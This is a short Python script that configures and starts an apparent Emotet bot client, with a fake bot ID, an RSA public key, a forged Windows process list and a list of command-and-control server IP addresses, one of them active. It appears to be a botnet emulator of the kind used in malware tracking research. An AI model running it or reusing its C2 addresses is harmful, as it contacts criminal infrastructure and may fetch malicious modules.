import emotet

ClientConf = {
	"BotId": "DESKTOPXO7LDD2E_5430495B",
	"OsVersion": 9502730,
	"VersionCRC": 3458175138,
	"PublicKey": "-----BEGIN PUBLIC KEY-----\nMHwwDQYJKoZIhvcNAQEBBQADawAwaAJhAK2pprg8hyRrnEu8ffLK2odoewFfUdQa\nFjRElrzJUVGpQEOpLZ70Q4oLQOpAh62j3J2GPFJ6tQtDZRjcQAhKPNVDBBDxvyeZ\ndQaKkoRf4fb0/qczCyQiXY9SrQybhlep9wIDAQAB\n-----END PUBLIC KEY-----t",
	"Unknown": "",
	"ModuleList": "GQAAAA0AAAAMAAAACQAAANcAAAA=",
	"ProcList": "chrome.exe,SearchUI.exe,ShellExperienceHost.exe,explorer.exe,ApplicationFrameHost.exe,conhost.exe,cmd.exe,dllhost.exe,rdpclip.exe,LogonUI.exe,RuntimeBroker.exe,SearchIndexer.exe,taskhostw.exe,sihost.exe,Memory Compression,SecurityHealthService.exe,spoolsv.exe,VSSVC.exe,dwm.exe,fontdrvhost.exe,svchost.exe,lsass.exe,services.exe,winlogon.exe,wininit.exe,csrss.exe,smss.exe,System,[System Process],"	
}

c2List = ["188.241.155.6:8080"]
"""
				"198.154.238.174:8080",
				"180.131.139.203:8080",
				"104.236.109.186:8080",
				"69.198.17.49:443",
				"107.170.177.153:8080",
				"194.88.246.9:80",
				"5.196.161.148:80",
				"216.70.105.121:8080",
				"46.17.57.9:80",
				"66.85.74.178:8080",
				"109.74.149.195:8080",
				"185.15.76.121:8080",
				"216.224.171.191:8080",
				"91.234.217.195:8080"]

"""
def main():
	c = emotet.client(ClientConf, c2List)
	c.start()


if __name__ == '__main__':
	main()
